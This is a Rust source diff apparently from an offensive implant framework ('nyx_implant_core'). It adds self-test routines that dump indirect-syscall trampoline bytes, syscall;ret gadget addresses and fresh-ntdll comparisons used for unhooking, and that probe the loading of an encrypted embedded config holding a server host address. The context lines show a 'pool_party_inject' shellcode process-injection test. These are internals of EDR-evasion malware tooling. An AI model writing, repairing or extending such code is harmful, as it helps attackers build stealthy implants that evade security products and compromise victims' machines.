@@ -2539,6 +2539,158 @@ pub unsafe extern "system" fn nyx_selftest_rt_probe() {
     unsafe { exit(if wok != 0 { 0xA7 } else { 0xA8 }) };
 }
 
+// ============================================================================
+// rt_dump: ARM64/Prism forensics. Dumps everything needed to diagnose why the
+// indirect-syscall runtime dies with 0xC000026F under x64 emulation:
+//   - IsWow64Process2 (process machine vs native machine)
+//   - resolved SSN for NtClose + the trampoline stub bytes built for it
+//   - in-process ntdll NtClose stub bytes (what the emulator really executes)
+//   - fresh KnownDlls map bytes at the same RVA (what SSN resolution read)
+//   - gadget address + 16 bytes there (is it really a `0F 05 C3` syscall;ret?)
+// Marker: %TEMP%\nyx_rt_dump.txt. Exits 0xD0 on completion.
+// ============================================================================
+
+/// u64 → 16-digit lowercase hex String (no format! under no_std).
+#[cfg(feature = "selftest")]
+fn hex_u64(mut v: u64) -> String {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut tmp = [0u8; 16];
+    let mut i = tmp.len();
+    if v == 0 {
+        i -= 1;
+        tmp[i] = b'0';
+    } else {
+        while v != 0 {
+            i -= 1;
+            tmp[i] = HEX[(v & 0xF) as usize];
+            v >>= 4;
+        }
+    }
+    let mut s = String::new();
+    for &b in &tmp[i..] {
+        s.push(b as char);
+    }
+    s
+}
+
+/// Hex-dump `n` bytes at `p` into a String ("4c8bd1b8..."). Unsafe read: the
+/// caller guarantees the range is mapped (gadget/stub/trampoline memory).
+#[cfg(feature = "selftest")]
+unsafe fn hex_dump(p: *const u8, n: usize) -> String {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut s = String::new();
+    for i in 0..n {
+        let b = unsafe { core::ptr::read_volatile(p.add(i)) };
+        s.push(HEX[(b >> 4) as usize] as char);
+        s.push(HEX[(b & 0xF) as usize] as char);
+    }
+    s
+}
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_rt_dump() {
+    use core::ffi::c_void;
+    let mut out = String::from("rt_dump v1\n");
+
+    // 1. Emulation detection: IsWow64Process2(GetCurrentProcess(), &pm, &nm).
+    //    nm=0x8664 → native x64; nm=0xAA64 → x64 emulated on ARM64 (Prism).
+    type IsWow64Process2 = unsafe extern "system" fn(*mut c_void, *mut u16, *mut u16) -> i32;
+    match export_addr(b"kernel32.dll", b"IsWow64Process2") {
+        Some(a) => {
+            let f: IsWow64Process2 = unsafe { core::mem::transmute(a) };
+            let mut pm: u16 = 0;
+            let mut nm: u16 = 0;
+            let ok = unsafe { f((-1isize) as *mut c_void, &mut pm, &mut nm) };
+            out.push_str("wow64p2 ok=");
+            out.push_str(&dec_i32(ok));
+            out.push_str(" proc=");
+            out.push_str(&hex_u32(pm as u32));
+            out.push_str(" native=");
+            out.push_str(&hex_u32(nm as u32));
+            out.push('\n');
+        }
+        None => out.push_str("wow64p2 missing\n"),
+    }
+
+    let rt = ensure_rt().unwrap();
+
+    // 1.5. Detection + degrade state (the Prism fallback must engage here).
+    out.push_str("detect_emulated=");
+    out.push(if nyx_implant_core::syscalls::is_x64_emulated_on_arm64() {
+        '1'
+    } else {
+        '0'
+    });
+    out.push_str(" direct_mode=");
+    out.push(if rt.is_direct_mode() { '1' } else { '0' });
+    out.push('\n');
+    if let Some(a) = rt.direct_by_hash(nyx_implant_core::resolve::djb2(b"ntclose")) {
+        out.push_str("direct_ntclose=");
+        out.push_str(&hex_u64(a as u64));
+        out.push('\n');
+    }
+
+    // 2. Resolved SSN for NtClose + the trampoline stub bytes at its slot.
+    let ssn = rt.ssn_by_hash(nyx_implant_core::resolve::djb2(b"ntclose"));
+    match ssn {
+        Some(s) => {
+            out.push_str("ssn_ntclose=");
+            out.push_str(&hex_u32(s));
+            out.push('\n');
+            let stub = unsafe { rt.trampoline_for(s) };
+            out.push_str("tramp=");
+            out.push_str(&unsafe { hex_dump(stub, 24) });
+            out.push('\n');
+        }
+        None => out.push_str("ssn_ntclose=UNRESOLVED\n"),
+    }
+
+    // 3. In-process ntdll NtClose stub bytes (what the emulator would execute
+    //    on a direct call) + its RVA for the fresh-map comparison.
+    let nc = export_addr(b"ntdll.dll", b"NtClose");
+    let rva: u64 = match nc {
+        Some(a) => {
+            out.push_str("inproc_ntclose=");
+            out.push_str(&unsafe { hex_dump(a as *const u8, 24) });
+            out.push('\n');
+            let base = unsafe { nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") };
+            match base {
+                Some(b) => (a as u64).wrapping_sub(b as u64),
+                None => u64::MAX,
+            }
+        }
+        None => {
+            out.push_str("inproc_ntclose=UNRESOLVED\n");
+            u64::MAX
+        }
+    };
+
+    // 4. Gadget address + bytes (must be 0f 05 c3 = syscall;ret).
+    let g = rt.gadget();
+    out.push_str("gadget=");
+    out.push_str(&hex_u64(g));
+    out.push_str(" bytes=");
+    out.push_str(&unsafe { hex_dump(g as *const u8, 16) });
+    out.push('\n');
+
+    // 5. Fresh KnownDlls map bytes at the same RVA (what SSN resolution read).
+    if rva != u64::MAX {
+        match unsafe { nyx_implant_core::unhook::fresh_ntdll_text() } {
+            Some((fb, _text_rva, _text_size)) => {
+                out.push_str("fresh_ntclose=");
+                out.push_str(&unsafe { hex_dump(fb.add(rva as usize), 24) });
+                out.push('\n');
+                unsafe { nyx_implant_core::unhook::unmap_fresh(fb) };
+            }
+            None => out.push_str("fresh_ntclose=MAP_FAILED\n"),
+        }
+    }
+
+    write_marker("nyx_rt_dump.txt", &out);
+    unsafe { exit(0xD0) };
+}
+
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_alloc_probe() {
@@ -3426,5 +3578,39 @@ mod ci_tests {
         // validates the section create/map/write path doesn't panic.
         let _ = unsafe { crate::tp::pool_party_inject(pid, &shellcode) };
         // Pass = didn't crash through NtCreateSection→NtMapViewOfSection→write.
+    }
+}
+
+// ============================================================================
+// cfgstage: runtime .nyx_cfg load-path stage probe (Prism/fallback debugging)
+// ============================================================================
+
+/// Exit codes: 0x60 magic!=0xDEADBEEF / 0x61 locate_ct fail / 0x62 decrypt
+/// fail / 0x63 parse fail / 0x64 empty host / else first byte of server_host
+/// (10 = patched 10.211.55.2, 127 = compile-time fallback).
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_cfgstage() {
+    use crate::config_placeholder as cp;
+    let base = core::hint::black_box(&cp::NYX_CFG_PLACEHOLDER as *const u8);
+    let section: &'static [u8] = unsafe { core::slice::from_raw_parts(base, 1024) };
+    let magic = u32::from_le_bytes([section[0], section[1], section[2], section[3]]);
+    if magic != 0xDEADBEEF {
+        // Echo the actual first byte (0xEF=patched, 0x41=unpatched, 0=zero).
+        exit(section[0] as u32);
+    }
+    let Some((kl, nonce, spub, ipriv, ct)) = cp::load_runtime_config_locate_ct() else {
+        exit(0x61);
+    };
+    let Some(pt) = cp::load_runtime_config_decrypt(kl, &nonce, &spub, &ipriv, ct) else {
+        exit(0x62);
+    };
+    let Some(parsed) = cp::load_runtime_config_parse_fields(&pt) else {
+        exit(0x63);
+    };
+    let host = parsed.0.as_bytes().to_vec();
+    match host.first() {
+        Some(b) => exit(*b as u32),
+        None => exit(0x64),
     }
 }
